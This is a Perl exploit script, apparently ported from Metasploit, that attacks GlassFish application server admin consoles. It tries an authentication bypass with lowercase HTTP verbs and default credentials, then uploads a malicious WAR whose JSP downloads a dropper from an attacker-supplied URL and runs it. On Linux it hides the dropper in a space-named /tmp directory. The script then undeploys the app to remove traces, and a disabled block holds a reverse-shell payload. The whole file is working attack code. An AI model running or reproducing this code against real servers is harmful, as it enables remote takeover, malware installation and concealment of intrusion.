#ported from metasploit by irrlicht
#june 2014
use strict;
use warnings;
#use lib qw(./modules/share/perl/5.14.2/);
use LWP::UserAgent;
use HTTP::Headers;
use URI::Escape;
use File::Path 'rmtree';
#This exploit logs in to an GlassFish Server 3.1 (Open Source or Commercial) 
#instance using a default credential, uploads, and executes commands via deploying
#a malicious WAR.  On Glassfish 2.x, 3.0 and Sun Java System Application Server 9.x
#this exploit will try to bypass authentication instead by sending lowercase HTTP verbs.
#admin port: 4848
#Runs dropper deploy.pl and deploy.exe from a webserver depending on the machine type.
my $target_host;
my $target_admin_host;
my $download_exec_url_win;
my $download_exec_url_linux;
my $linux_command = "mkdir /tmp/\\\" \\\"; mv /tmp/deploy.pl /tmp/\\\" \\\"/deploy.pl; cd /tmp/\\\" \\\"; nohup perl deploy.pl > /dev/null 2>&1 &";
my %verbs = ();
sub send_request {
 my ($path, $method, $session, $data, $ctype, $reqhttpport) = @_;
 my $target_host_;
 if ($reqhttpport && $reqhttpport == 1) {
  $target_host_ = $target_host;
 } else {
  $target_host_ = $target_admin_host;
 }
 my $ua = new LWP::UserAgent(ssl_opts => { verify_hostname => 0 });
 $ua->timeout(10);
 $ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.98 Safari/534.13");
 my $headers = HTTP::Headers->new;
 if ($session && $session ne "") {
  $headers->header('Cookie' => "JSESSIONID=" . $session);
 }
 if ($ctype && $ctype ne "") {
  $headers->header('Content-Type' => $ctype);
 }
 if ($data &&$data ne "") {
  $headers->header('Content-Length' => length($data));
 }
 my $request;
 if (($session && $session ne "") || ($ctype && $ctype ne "")) {
   if ($data && $data ne "") {
    $request = new HTTP::Request($method, $target_host_ . $path, $headers, $data);
   } else {
    $request = new HTTP::Request($method, $target_host_ . $path, $headers);
   }
 } else {
  $request = new HTTP::Request($method, $target_host_ . $path);
 }
 my $response = $ua->request($request);

 #print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";
 #print $path;
 #print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";
 #print $response->content;

 my $code = $response->code;
 my $body = $response->content;

 if ($code == 500) {
  print "Connection or internal server error\n";
  exit -1;
 }

 my $server = "";
 my $setcookie = "";
 if ($response->header('server') && $response->header('server') ne "") {
  $server = $response->header('server');
 }
 if ($response->header('set-cookie') && $response->header('set-cookie') ne "") {
  $setcookie = $response->header('set-cookie');
 }
 return ($code, $body, $server, $setcookie);
}

sub query_server_info {
 my ($session, $version) = @_;
 my @res = ();
 my $path;
 if ($version eq "2.x" || $version eq "9.x") {
  $path = "/appServer/jvmReport.jsf?instanceName=server&pageTitle=JVM%20Report";
  @res = send_request($path, $verbs{'GET'}, $session);
 } else {
  $path = "/common/appServer/jvmReport.jsf?pageTitle=JVM%20Report";
  @res = send_request($path, $verbs{'GET'}, $session);
  if ($res[0] != 200 || not $res[1] =~ /Operating System Information/) {
   $path = "/common/appServer/jvmReport.jsf?reportType=summary&instanceName=server";
   @res = send_request($path, $verbs{'GET'}, $session);   
  }
 }
 if ($res[0] != 200) {
  print "Failed: Error requesting " . $path . "\n";
  exit -1;
 }

 return @res;
}

sub detect_platform {
 my $body = shift;
 my @lines = split("\n", $body);
 foreach my $line (@lines) {
  chomp $line;
  if ($line =~ /os\.name\ =\ (.*)/) {
   my $os = $1;
   print "That's an $os\n";
   if ($os =~ /Windows/) {
    return 'win';
   }
   if ($os =~ /Linux/) {
    return 'linux';
   }
   if ($os =~ /Mac OS X/) {
    return 'osx';
   }
  }
 }
}

sub auto_target {
 my ($session, $version) = @_; ### XXX no res var, only 2 parameters
 print "Attempting to automatically select a target...\n";
 my @res = query_server_info($session, $version);
 if ($res[1] eq "") {
  print "Can not automatically select target\n";
  exit -1;
 }
 my $plat = detect_platform($res[1]);
 if ($plat ne "win" && $plat ne "linux") { ## We don't support macosx yet
  print "Can't use platform ... " . $plat . "\n";
  exit -1;
 }
 return $plat;
}

sub get_delete_info {
 my($session, $version, $app) = @_;
 my $viewstate = "";
 my $entry = "";

 if ($version eq "2.x" || $version eq "9.x") {
  my $path = "/applications/webApplications.jsf";
  my @res = send_request($path, $verbs{'GET'}, $session);
  if ($res[0] != 200) {
   print "Error requesting $path\n";
   exit -1;
  }

  my $input_id = "javax.faces.ViewState";
  my $body = $res[1];
  if ($body =~ /input type="hidden" name="$input_id" id="$input_id" value="(j_id\d+:j_id\d+)"/) {
   $viewstate = $1;
  }

  while($body =~ m/<a id="(.*)col1:link" href="\/applications\/webApplicationsEdit.jsf.*appName=(.*)">/g) {
   if ($2 =~ /^$app/) {
    $entry = $1;
    $entry .= "col0:select";
   }
  }
 } else {
  my $path = "/common/applications/applications.jsf?bare=true";
  my @res = send_request($path, $verbs{'GET'}, $session);
  if ($res[0] != 200) {
   print "Error requesting $path\n";
   exit -1;   
  }

  my $input_id = "javax.faces.ViewState";
  my $body = $res[1];
  if ($body =~ /input type="hidden" name="$input_id" id="$input_id" value="(.*)" autocomplete="off"/) {
   $viewstate = $1;
  }

  while($body =~ m/<a id="(.*)col1:link" href="\/common\/applications\/applicationEdit.jsf.*appName=(.*)"/g) {
   if ($2 =~ /^$app/) {
    $entry = $1;
    $entry .= "col0:select";
   }
  }
 }
 
 if ($viewstate eq "") {
  print "Error getting ViewState\n";
  exit -1;
 }

 if ($entry eq "") {
  print "Error getting entry to delete\n";
  exit -1;
 }

 return ($viewstate, $entry);
}

sub undeploy {
 my ($viewstate, $session, $entry) = @_;
 my $entry_encoded = uri_escape($entry);
 my $viewstate_encoded = uri_escape($viewstate);
 my $data = "propertyForm%3AdeployTable%3AtopActionsGroup1%3Afilter_list=".
  "&propertyForm%3AdeployTable%3AtopActionsGroup1%3Afilter_submitter=false".
  "&" . $entry_encoded . "=true".
  "&propertyForm%3AhelpKey=ref-applications.html".
  "&propertyForm_hidden=propertyForm_hidden".
  "&javax.faces.ViewState=" . $viewstate_encoded .
  "&com_sun_webui_util_FocusManager_focusElementId=propertyForm%3AdeployTable%3AtopActionsGroup1%3Abutton1".
  "&javax.faces.source=propertyForm%3AdeployTable%3AtopActionsGroup1%3Abutton1".
  "&javax.faces.partial.execute=%40all".
  "&javax.faces.partial.render=%40all".
  "&bare=true".
  "&propertyForm%3AdeployTable%3AtopActionsGroup1%3Abutton1=propertyForm%3AdeployTable%3AtopActionsGroup1%3Abutton1".
  "&javax.faces.partial.ajax=true";

  my $path = "/common/applications/applications.jsf";
  my $ctype = "application/x-www-form-urlencoded";
  my @res = send_request($path, $verbs{'POST'}, $session, $data, $ctype);
  if ($res[0] < 200 || $res[0] >= 300) {
    print "Undeployment failed on $path - " . $res[0];
    exit -1;
  }
}

sub get_version {
 my @res = @_;
 my $banner = $res[2];
 my $edition = "Commercial";
 my $version = "unknown";
 if ($banner =~ /(Open Source|Sun GlassFish Enterprise Server|Sun Java System Application Server)/) {
  $edition = "Open Source";
 }
 if ($banner =~ /(GlassFish Server|Open Source Edition) (\d\.\d)$/) {
  $version = $2;
 } elsif ($banner =~ /GlassFish v(\d)/) {
  $version = $1;
 } elsif ($banner =~ /Sun GlassFish Enterprise Server v2/) {
  $version = "2.x";
 } elsif ($banner =~ /Sun GlassFish Communications Server 2/) {
  $version = "2.x";
 } elsif ($banner =~ /Sun Java System Application Server 9/) {
  $version = "9.x";
 }

 if ($version eq "" || $version eq "Unknown") {
  print "Unsupported version: " . $banner . "\n";
 }

 return ($edition, $version, $banner);
}

sub format_2_x_war {
 my ($boundary, $name, $value, $war) = @_;
 my $data = "";
 $data .= $boundary;
 $data .= "\r\nContent-Disposition: form-data; name=\"form:title:sheet1:section1:prop1:fileupload\"; ";
 $data .= "filename=\"" . $name . ".war\"\r\nContent-Type: application/octet-stream\r\n\r\n";
 $data .= $war;
 $data .= "\r\n";
 return $data;
}

sub format_ {
 my ($boundary, $name, $value, $war) = @_;
 my $data = "";

 if ($war && $war ne "") {
  $data .= $boundary;
  $data .= "\r\nContent-Disposition: form-data; name=\"form:sheet1:section1:prop1:fileupload\"; ";  
  $data .= "filename=\"" . $name . ".war\"\r\nContent-Type: application/octet-stream\r\n\r\n";
  $data .= $war;
  $data .= "\r\n";
 } else {
  $data .= $boundary;
  $data .= "\r\nContent-Disposition: form-data; name=\"" . $name . "\"";
  $data .= "\r\n\r\n";
  $data .= $value . "\r\n";
 }
 return $data;
}

sub get_upload_data {
 my ($boundary, $version, $war, $app_base, $typefield, $status_checkbox, $start, $viewstate) = @_;
 my $data = "";
 
 if ($version eq "3.0") {
  my $uploadParam_name = "form:sheet1:section1:prop1:fileupload_com.sun.webui.jsf.uploadParam";
  my $uploadparam_data = "form:sheet1:section1:prop1:fileupload";
  $boundary = "--" . $boundary;
  $data = format_($boundary, $app_base, "", $war) .
   format_($boundary, $uploadParam_name, $uploadparam_data) . 
   format_($boundary, "form:sheet1:section1:prop1:extension", ".war") .
   format_($boundary, "form:sheet1:section1:prop1:action", "client") .
   format_($boundary, $typefield, "war") .
   format_($boundary, "form:war:psection:cxp:ctx", $app_base) .
   format_($boundary, "form:war:psection:nameProp:appName", $app_base) .
   format_($boundary, "form:war:psection:vsProp:vs", "") .
   format_($boundary, $status_checkbox, "true") .
   format_($boundary, "form:war:psection:librariesProp:library", "") .
   format_($boundary, "form:war:psection:descriptionProp:description", "") .
   format_($boundary, "form_hidden", "form_hidden") .
   format_($boundary, "javax.faces.ViewState", $viewstate) .
   $boundary . "--";
 } elsif ($version eq "2.x" || $version eq "9.x") {
  my $uploadParam_name = "form:title:sheet1:section1:prop1:fileupload_com.sun.webui.jsf.uploadParam";
  my $uploadParam_data = "form:title:sheet1:section1:prop1:fileupload";
  my $focusElementId_name = "com_sun_webui_util_FocusManager_focusElementId";
  my $focusElementId_data = "form:title:topButtons:uploadButton";
  $boundary = "-----------------------------" . $boundary;
  $data = format_2_x_war($boundary, $app_base, "", $war).
   format_($boundary, "form:title:sheet1:section1:type:appType", "webApp").
   format_($boundary, "uploadRdBtn", "client").
   format_($boundary, $uploadParam_name, $uploadParam_data).
   format_($boundary, "form:title:sheet1:section1:prop1:extension", ".war").
   format_($boundary, "form:title:ps:psec:nameProp:appName", $app_base).
   format_($boundary, "form:title:ps:psec:cxp:ctx", $app_base).
   format_($boundary, "form:title:ps:psec:vsp:vs", "").
   format_($boundary, $status_checkbox, "true").
   format_($boundary, "form:title:ps:psec:librariesProp:library", "").
   format_($boundary, "form:title:ps:psec:threadpoolProp:threadPool", "").
   format_($boundary, "form:title:ps:psec:registryProp:registryType", "").
   format_($boundary, "form:title:ps:psec:descriptionProp:description", "").
   format_($boundary, "form:helpKey", "uploaddev.html").
   format_($boundary, "form_hidden", "form_hidden").
   format_($boundary, "javax.faces.ViewState", $viewstate).
   format_($boundary, $focusElementId_name, $focusElementId_data).
   $boundary . "--";
 } else {
  $boundary = "-----------------------------" . $boundary;
  my $num1 = int($start);
  my $num2 = $num1 + 14;
  my $num3 = $num2 + 2;
  my $num4 = $num3 + 2;
  my $num5 = $num4 + 2;
  my $num6 = $num5 + 2;
  my $num7 = $num6 + 1;

  my $id0 = $num4;
  my $id1 = $num4 + 1;
  my $id2 = $num4 + 2;
  my $id3 = $num4 + 3;
  my $id4 = $num4 + 4;
  my $id5 = $num4 + 5;
  my $id6 = $num4 + 6;
  my $id7 = $num4 + 7;
  my $id8 = $num4 + 8;
  my $id9 = $num4 + 9;

  my $uploadParam_name = "form:sheet1:section1:prop1:fileupload_com.sun.webui.jsf.uploadParam";
  my $uploadParam_value = "form:sheet1:section1:prop1:fileupload";
  my $focusElementId_name = "com_sun_webui_util_FocusManager_focusElementId";
  my $focusElementId_data = "form:title2:bottomButtons:uploadButton";

  $data = format_($boundary,"uploadRdBtn","client").
   ## web service
   format_($boundary, $app_base, "", $war).
   ## sheet1
   format_($boundary, $uploadParam_name, $uploadParam_value).
   format_($boundary,"form:sheet1:section1:prop1:extension",".war").
   format_($boundary,"form:sheet1:section1:prop1:action","client").
   format_($boundary,"form:sheet1:sun_propertySheetSection" . $num1 . ":type:appType","war").
   format_($boundary,"form:appClient:psection:nameProp:appName",$app_base).
   format_($boundary,"form:appClient:psection:descriptionProp:description").
   ## war
   format_($boundary,"form:war:psection:cxp:ctx",$app_base).
   format_($boundary,"form:war:psection:nameProp:appName",$app_base).
   format_($boundary,"form:war:psection:vsProp:vs").
   format_($boundary,"form:war:psection:enableProp:sun_checkbox" . $id1, "true").
   format_($boundary,"form:war:psection:enableProp:sun_checkbox" . $id2, "true").
   format_($boundary,"form:war:psection:enableProp:sun_checkbox" . $id3, "true").
   format_($boundary,"form:war:psection:enableProp:sun_checkbox" . $id4, "true").
   format_($boundary,"form:war:psection:enableProp:sun_checkbox" . $id5, "true").
   format_($boundary,"form:war:psection:enableProp:sun_checkbox" . $id6, "true").
   format_($boundary,"form:war:psection:enableProp:sun_checkbox" . $id7, "true").
   format_($boundary,"form:war:psection:enableProp:sun_checkbox" . $id8, "true").
   format_($boundary,"form:war:psection:enableProp:sun_checkbox" . $id9, "true").
   format_($boundary,"form:war:psection:librariesProp:library").
   format_($boundary,"form:war:psection:descriptionProp:description").
   format_($boundary,"form_hidden","form_hidden").
   format_($boundary,"javax.faces.ViewState",$viewstate).
   format_($boundary, $focusElementId_name, $focusElementId_data); 
   my $item_list_name = "form:targetSection:targetSectionId:addRemoveProp:commonAddRemove_item_list";
   my $item_list_data = "|server|com.sun.webui.jsf.separator|";
   my $item_value_name = "form:targetSection:targetSectionId:addRemoveProp:commonAddRemove_list_value";
   my $item_value_data = "server";
   $data .= format_($boundary, $item_list_name, $item_list_data);
   $data .= format_($boundary, $item_value_name, $item_value_data);
   $data .= $boundary . "--";
   $data .= "\r\n\r\n";
 }

 return $data;
}

sub upload_exec {
 my ($session, $app_base, $jsp_name, $target, $war, $edition, $version) = @_;
 my $viewstate = "";
 my $status_checkbox = "";
 my $boundary = "";
 my $start = "";
 my $typefield = "";
 if ($version eq "2.x" || $version eq "9.x") {
  my $path = "/applications/upload.jsf?appType=webApp";
  my @res = send_request($path, $verbs{'GET'}, $session);
  my $body = $res[1];
  if ($body =~ /id="javax\.faces\.ViewState" value="(j_id\d{1,5}:j_id\d{1,5})"/mi) {
   $viewstate = $1;
  } else {
   print "Unable to gather required data for file upload\n";
   exit -1;
  }
  if ($body =~ /input type="checkbox" id="form:title:ps:psec:enableProp:sun_checkbox\d+" name="(.*)" checked/mi) {
   $status_checkbox = $1;
  } else {
   print "Unable to gather required data for file upload\n";
   exit -1;
  }
  my @chars = ("A".."Z", "a".."z");
  $boundary .= $chars[rand @chars] for 1..28;
 } else {
  my $path = "/common/applications/uploadFrame.jsf";
  my @res = send_request($path, $verbs{'GET'}, $session);
  my $body = $res[1];
  if ($body =~ /propertySheetSection(\d{3})/) {
   $start = $1;
  }
  
  if ($body =~ /"javax\.faces\.ViewState" value="(-?\d+:-?\d+)"/mi) {
   $viewstate = $1;
  } else {
   print "Unable to gather required data for file upload\n";
   exit -1;
  }

  if ($body =~ /select class="MnuStd_sun4" id="form:sheet1:sun_propertySheetSection.*:type:appType" name="(.*)" size/) {
   $typefield = $1;
  } else {
   print "Unable to gather required data for file upload\n";
   exit -1;
  }

  if ($body =~ /input type="checkbox" id="form:war:psection:enableProp:sun_checkbox.*" name="(.*)" checked/) {
   $status_checkbox = $1;
  } else {
   print "Unable to gather required data for file upload\n";
   exit -1;
  }

  my @chars = ("A".."Z", "a".."z");
  if ($edition eq "Open Source") {
   $boundary .= $chars[rand @chars] for 0..15;
  } else {
   $boundary .= $chars[rand @chars] for 1..29;
  }
 }

 my $ctype = "";
 if ($version eq "3.0") {
  $ctype = "multipart/form-data; boundary=" . $boundary;
 } elsif ($version eq "2.x" || $version eq "9.x") {
  $ctype = "multipart/form-data; boundary=---------------------------" . $boundary;
  $typefield = "";
  $start = "";
 } else {
  $ctype = "multipart/form-data; boundary=---------------------------" . $boundary;
 }

 my $post_data = get_upload_data($boundary, $version, $war, $app_base, $typefield, $status_checkbox, $start, $viewstate);
 
 my $path = "";
 if ($version eq "2.x" || $version eq "9.x") {
  $path = "/applications/upload.jsf?form:title:topButtons:uploadButton=%20%20OK%20%20";
 } else {
  $path = "/common/applications/uploadFrame.jsf?";
  $path .= "form:title:topButtons:uploadButton=Processing...";
  $path .= "&bare=false";
 }

 my @res = send_request($path, $verbs{'POST'}, $session, $post_data, $ctype);
 if ($res[0] == 302) {
  print "Upload Success\n";
 } else {
  print "Upload Error: " . $res[0] . "\n";
  exit -1;
 }

 my $jsp_path = "/" . $app_base . "/" . $jsp_name . ".jsp";
 sleep 5;
 @res = send_request($jsp_path, 'GET', "", "", "", 1);
 if ($res[0] == 200) {
  print "JSP Executed\n";
 } else {
  print "Execute Error: " . $res[0] . "\n";
  exit -1;
 }

 print "Sleep 10 seconds for the deployer to work\n";
 sleep 10;
 print "Get info to undeploy\n";
 my $entry = "";
 ($viewstate, $entry) = get_delete_info($session, $version, $app_base);
 if ($viewstate eq "") {
  print "Unable to get viewstate\n";
  exit -1;
 }
 if ($entry eq "") {
  print "Unable to get entry\n";
  exit -1;
 }

 print "Undeploy " . $app_base . "\n";
 undeploy($viewstate, $session, $entry);
 print "Undeployment complete\n";
}

sub try_login {
 my ($user, $pass) = @_; 
 my $data = "j_username=" . uri_escape($user) . "&";
 $data .= "j_password=" . uri_escape($pass) . "&";
 $data .= "loginButton=Login";
 my $path = "/j_security_check";
 my @res = send_request($path, $verbs{'POST'}, '', $data, 'application/x-www-form-urlencoded');

 return @res;
}

sub log_success {
 my ($user, $pass) = @_;
 print $target_admin_host . " - GlassFish - SUCCESSFUL login for '$user' : '$pass'\n";
}

sub try_default_glassfish_login {
 my $version = shift;
 my $success = 0;
 my $session = "";
 my @res = ();
 my ($user, $pass);
 if ($version eq "2.x" || $version eq "9.x") {
  $user = "admin";
  $pass = "adminadmin";

  print "Trying default credential GlassFish 2.x $user:'$pass'\n";
  @res = try_login($user, $pass);
  if ($res[0] == 302) {
   if ($res[3] =~ /JSESSIONID=(.*); /i) {
    $session = $1;
   }
   @res = send_request('/applications/upload.jsf', 'GET', $session);
   if ($res[0] == 200) {
    if ($res[1] =~ /<title>Deploy Enterprise Applications\/Modules/) {
     $success = 1;
    }
   }
  }
 } else {
  $user = "admin";
  $pass = "";
  print "Trying default credential GlassFish 3.x $user:'$pass'\n";
  @res = try_login($user, $pass);
  if ($res[0] == 302) {
   if ($res[3] =~ /JSESSIONID=(.*); /i) {
    $session = $1;
   }
   @res = send_request('/common/applications/uploadFrame.jsf', 'GET', $session);
   if ($res[0] == 200) {
    if ($res[1] =~ /<title>Deploy Applications or Modules/) {
     $success = 1;
    }
   }
  }
 }

 if ($success == 1) {
  log_success($user, $pass);
 } else {
  print $target_admin_host . " - GlassFish - Failed to authenticate login for '$user' : '$pass'\n";
 }

 return ($success, @res, $session);
}

sub try_glassfish_auth_bypass {
 my $version = shift;
 print "Trying GlassFish authentication bypass\n";
 my $success = 0;

 if ($version eq "2.x" || $version eq "9.x") {
  my @res = send_request('/applications/upload.jsf', 'get');
  if ($res[0] == 200) {
   if ($res[1] =~ /<title>Deploy Enterprise Applications\/Modules/) {
    $success = 1;
   }
  }
 } else {
  my @res = send_request('/common/applications/uploadFrame.jsf', 'get');
  if ($res[0] == 200) {
   if ($res[1] =~ /<title>Deploy Applications or Modules/) {
    $success = 1;
   }
  }
 }

 if ($success == 1) {
  print $target_admin_host . " - GlassFish - SUCCESSFUL authentication bypass\n";
 } else {
  print $target_admin_host . " - GlassFish - Failed authentication bypass\n";
 }

 return $success;
}


sub usage() {
 print $0 . " <target_host_url> <target_admin_port_url> <download_and_exec_url_windows> <download_and_exec_url_linux>\n";
 exit;
}

sub create_war {
 my ($jsp_name, $app_base, $mytarget) = @_;
 my $deploy_filename;
 my $deploy_command;
 my $download_exec_url;
 my $war;
 if ($mytarget eq 'win') {
  $deploy_filename = "deploy.exe";
  $deploy_command = "deploy.exe";
  $download_exec_url = $download_exec_url_win;
 }
 if ($mytarget eq 'linux') {
  $deploy_filename = "deploy.pl";
  $deploy_command = $linux_command;
  $download_exec_url = $download_exec_url_linux;
 }
 my $jsp = "<%@\n" . 
"page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"\n" .
"%>\n".
"<%\n".
"URL url = new URL(\"" . $download_exec_url . "\");\n".
"URLConnection connection = url.openConnection();\n";
if ($mytarget ne 'win') {
$jsp .= "String tmpdir = \"/tmp/\";\n";
}
$jsp .= "InputStream stream = connection.getInputStream();\n".
"BufferedInputStream in = new BufferedInputStream(stream);\n";
if ($mytarget ne 'win') {
$jsp .= "FileOutputStream file = new FileOutputStream(tmpdir + \"" . $deploy_filename . "\");\n";
} else {
$jsp .= "FileOutputStream file = new FileOutputStream(\"" . $deploy_filename . "\");\n";
}
$jsp .= "BufferedOutputStream out_ = new BufferedOutputStream(file);\n".
"int i;\n".
"while ((i = in.read()) != -1) {\n".
"    out_.write(i);\n".
"}\n".
"out_.flush();\n".
"out_.close();\n".
"file.flush();\n".
"file.close();\n";
if ($mytarget eq 'win') {
$jsp .= "Runtime.getRuntime().exec(\"$deploy_command\");\n";
} else {
$jsp .= "String[] command = new String[3];\n";
$jsp .= "command[0] = \"/bin/sh\";\n";
$jsp .= "command[1] = \"-c\";\n";
$jsp .= "command[2] = \"$deploy_command\";\n";
$jsp .= "Runtime.getRuntime().exec(command);\n";
}
$jsp .= "%>";
if (0) {
$jsp ="
<%@
page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"
%>
			<%!
				static class StreamConnector extends Thread
				{
					InputStream is;
					OutputStream os;

					StreamConnector( InputStream is, OutputStream os )
					{
						this.is = is;
						this.os = os;
					}

					public void run()
					{
						BufferedReader in  = null;
						BufferedWriter out = null;
						try
						{
							in  = new BufferedReader( new InputStreamReader( this.is ) );
							out = new BufferedWriter( new OutputStreamWriter( this.os ) );
							char buffer[] = new char[8192];
							int length;
							while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
							{
								out.write( buffer, 0, length );
								out.flush();
							}
						} catch( Exception e ){}
						try
						{
							if( in != null )
								in.close();
							if( out != null )
								out.close();
						} catch( Exception e ){}
					}
				}
			%>
			<%
				try
				{
					Socket socket = new Socket( \"0.0.0.0\", 5555 );
					Process process = Runtime.getRuntime().exec( \"/bin/sh\" );
					( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
					( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
				} catch( Exception e ) {}
			%>";

}
 my $webxml = "<?xml version=\"1.0\"?>\n". 
 "<!DOCTYPE web-app PUBLIC\n".
 "\"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n".
 "\"http://java.sun.com/dtds/web-app_2_3.dtd\">\n".
 "<web-app>\n".
 " <servlet>\n".
 "  <servlet-name>" . $app_base . "</servlet-name>\n".
 "  <jsp-file>/" . $jsp_name . ".jsp</jsp-file>\n".
 " </servlet>\n".
 "</web-app>";
rmtree(["WAR"]);
mkdir("WAR");
chdir("WAR");
open FILE, ">" . $jsp_name . ".jsp";
print FILE $jsp;
close FILE;
mkdir("META-INF");
chdir("META-INF");
open FILE, ">MANIFEST.MF";
close FILE;
chdir("..");
mkdir("WEB-INF");
chdir("WEB-INF");
open FILE, ">web.xml";
print FILE $webxml;
close FILE;
chdir("..");
system("zip deploy.war " . $jsp_name . ".jsp META-INF/MANIFEST.MF WEB-INF/web.xml");
open FILE, "<deploy.war";
binmode FILE;
read(FILE, $war, -s 'deploy.war');
close FILE;
#unlink "deploy.war";
chdir "..";
return $war;
}

sub exploit {
 my $success = 0;
 my $session = "";
 my $edition = "";
 my $version = "";
 my $session_login = "";
 my $banner = "";
 my $jsp_name = "";
 my $app_base = "";
 my @res = send_request('/common/index.jsf', 'GET');
 if ($res[0] == 302) {
  @res = send_request('/login.jsf', 'GET');
 }

 ($edition, $version, $banner) = get_version(@res);
 print "GlassFish edition: " . $banner . "\n";
 if ($res[3] =~ /JSESSIONID=(.*); /) {
  $session = $1;
 }
 if ($version eq "3.0" || $version eq "2.x" || $version eq "9.x") {
  $verbs{'GET'} = "get";
  $verbs{'POST'} = "post";
 } else {
  $verbs{'GET'} = "GET";
  $verbs{'POST'} = "POST";
 }

 if ($version eq "3.0" || $version eq "2.x" || $version eq "9.x") {
  $success = try_glassfish_auth_bypass($version);
 }

 if (!$success and $version ne '9.x') {
  ($success, @res, $session_login) = try_default_glassfish_login($version);
 }

 if ($success) {
  if ($session_login =~ /\w+/) {
   $session = $session_login;
  }
  my @chars = ("A".."Z", "a".."z");
  my ($jsp_name, $app_base);
  $jsp_name .= $chars[rand @chars] for 1..32;
  $app_base .= $chars[rand @chars] for 1..32;
  my $mytarget = auto_target($session, $version);
  my $war = create_war($jsp_name, $app_base, $mytarget);
  print "Upload payload\n";
  my @res = upload_exec($session, $app_base, $jsp_name, $mytarget, $war, $edition, $version);
 } else {
  print $target_admin_host . " - GlassFish - Failed to authenticate login\n";
 }
}
srand(time());
if (!$ARGV[3]) {
 usage();
}
$target_host = $ARGV[0];
$target_admin_host = $ARGV[1];
$download_exec_url_win = $ARGV[2];
$download_exec_url_linux = $ARGV[3];
if (substr($target_host, length($target_host)-1, 1) eq '/') {
 $target_host = substr($target_host, 0, length($target_host)-1);
}
if (substr($target_admin_host, length($target_admin_host)-1, 1) eq '/') {
 $target_host = substr($target_admin_host, 0, length($target_admin_host)-1);
}
exploit();

